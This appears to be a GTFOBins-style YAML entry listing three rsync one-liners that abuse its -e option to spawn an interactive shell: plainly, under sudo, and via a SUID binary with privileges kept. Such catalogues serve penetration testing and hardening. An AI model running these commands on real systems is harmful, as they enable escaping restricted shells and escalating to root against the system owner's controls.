---
functions:
  execute-interactive:
    - code: rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
  sudo-enabled:
    - code: sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
  suid-enabled:
    - code: ./rsync -e 'sh -p -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
---
